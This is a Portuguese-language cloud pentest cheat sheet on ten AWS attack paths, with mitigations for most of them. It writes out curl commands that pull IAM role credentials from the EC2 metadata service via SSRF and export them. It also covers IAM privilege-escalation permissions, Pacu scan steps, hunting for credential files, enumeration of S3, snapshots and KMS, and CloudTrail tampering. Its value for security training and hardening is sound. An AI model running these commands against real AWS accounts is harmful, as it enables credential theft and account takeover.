# AWS - Attack Paths Comuns

> Caminhos recorrentes em engagements AWS. Cada item tem detection, exemplo de comando e mitigacao.

---

## 1. SSRF -> IMDS -> Credenciais

EC2 expoe metadata em `169.254.169.254`. Quando uma aplicacao no instance tem SSRF, atacante extrai credentials da role anexada.

```bash
# IMDSv1 (legado, sem header de protecao)
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/<roleName>

# IMDSv2 (precisa token PUT)
TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 60")
curl -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

Depois exporta como env:
```bash
export AWS_ACCESS_KEY_ID=...
export AWS_SECRET_ACCESS_KEY=...
export AWS_SESSION_TOKEN=...
aws sts get-caller-identity
```

**Mitigacao.** Forcar IMDSv2 (`HttpTokens=required`), `HttpPutResponseHopLimit=1`, role com privilegio minimo.

---

## 2. IAM Privilege Escalation

Permissoes inocentes que viram admin:

| Permissao | Escalada |
|-----------|----------|
| `iam:CreatePolicyVersion` | Substitui policy attached por `*` Allow. |
| `iam:SetDefaultPolicyVersion` | Reverte para versao maliciosa. |
| `iam:CreateAccessKey` (em outro user) | Cria chave para conta admin existente. |
| `iam:AttachUserPolicy` / `AttachRolePolicy` | Anexa `AdministratorAccess`. |
| `iam:PutUserPolicy` | Inline policy abusada. |
| `iam:UpdateAssumeRolePolicy` | Assume role privilegiada. |
| `iam:PassRole` + `ec2:RunInstances` | Roda EC2 com role admin e usa user-data como C2. |
| `lambda:CreateFunction` + `lambda:InvokeFunction` + `iam:PassRole` | Cria Lambda com role admin e dispara. |

Use **[Pacu](https://github.com/RhinoSecurityLabs/pacu)** para enumeracao automatizada:

```bash
pacu
> import_keys default
> run iam__enum_users_roles_policies_groups
> run iam__privesc_scan
```

**Mitigacao.** SCPs, separacao de permissoes admin (separar `IAM` de `Compute`), least privilege, AccessAnalyzer.

---

## 3. S3 Misconfigurations

```bash
# Listar buckets do account atual
aws s3 ls

# Buckets publicos (do mundo externo, sem creds)
curl https://<bucket>.s3.amazonaws.com/
aws s3 ls s3://<bucket>/ --no-sign-request

# ACL e Policy
aws s3api get-bucket-acl --bucket <bucket>
aws s3api get-bucket-policy --bucket <bucket>
```

Pegadinhas comuns:
- Bucket `*-backups`, `*-dev`, `*-logs` com listing publico.
- `s3:GetObject` para `Principal: *` mas com `PutObject` restrito - leak only.
- Versioning desabilitado -> conteudo deletado vai embora.
- Bucket cross-region replication para conta atacante (via `PutReplicationConfiguration`).

**Mitigacao.** Block Public Access em conta, ACLs disabled (ownership=BucketOwnerEnforced), SSE-KMS, MFA Delete.

---

## 4. Sessions Tokens "esquecidos"

```bash
# Em developer machines / containers
~/.aws/credentials
env | grep AWS_
```

Tambem em ConfigMaps Kubernetes, env vars do Lambda, e em logs (`AWS_ACCESS_KEY_ID` impresso por engano).

---

## 5. Cross-Account via Trust Policy fraca

Procurar roles cujo trust policy permite assume de fora:

```json
{
  "Effect": "Allow",
  "Principal": {"AWS": "arn:aws:iam::000011112222:root"},
  "Action": "sts:AssumeRole",
  "Condition": {"StringEquals": {"sts:ExternalId": "static-value"}}
}
```

Se conhecemos o ExternalId (vaza em commits, support tickets, vendor docs), conseguimos `sts:AssumeRole`.

**Mitigacao.** ExternalId aleatorio e rotacionado, `sts:ExternalId` policy enforcado, MFA condition.

---

## 6. CloudTrail Tampering

Atacante com `cloudtrail:DeleteTrail` ou `cloudtrail:StopLogging` apaga visibilidade.

**Mitigacao.** Multi-region trail com `LogFileValidationEnabled=true`, KMS key gerenciada por conta separada, EventBridge para alerta.

---

## 7. Lambda Function URL & Resource Policy

```bash
aws lambda list-functions --query "Functions[].FunctionName"
aws lambda get-function-url-config --function-name <fn>
aws lambda get-policy --function-name <fn>
```

Function URL `AuthType=NONE` -> publico. Resource policy com `Principal: *` -> qualquer conta invoca.

---

## 8. EBS Volume Snapshots Publicas

```bash
aws ec2 describe-snapshots --restorable-by-user-ids all --owner-ids <victim-account>
```

Snapshots publicas vazam discos inteiros. Tambem RDS, AMI, FSx.

---

## 9. AWS SSO Device Code Phishing

Usuarios autenticam via codigo no portal. Atacante cria URL falsa que reenvia codigo.

---

## 10. KMS Key Policy aberta

```bash
aws kms describe-key --key-id <id>
aws kms get-key-policy --key-id <id> --policy-name default
```

Procurar `Principal: *` ou `AWS: *` na policy - permite decrypt sem cross-account check.

---

## Ferramentas

- **Pacu** - framework de exploitation modular.
- **CloudFox** - enumeration focado em moveis para o atacante.
- **ScoutSuite** - multi-cloud audit defensivo, util para o red team mapear.
- **enumerate-iam** - testa permissoes brute-force-style.
- **awspx** - visualizacao de relacionamentos IAM (estilo BloodHound).

## Referencias

- [Hacking the Cloud](https://hackingthe.cloud/)
- [AWS Customer Security Incident Response Guide](https://docs.aws.amazon.com/whitepapers/latest/aws-security-incident-response-guide/)
- [MITRE ATT&CK Cloud Matrix](https://attack.mitre.org/matrices/enterprise/cloud/)
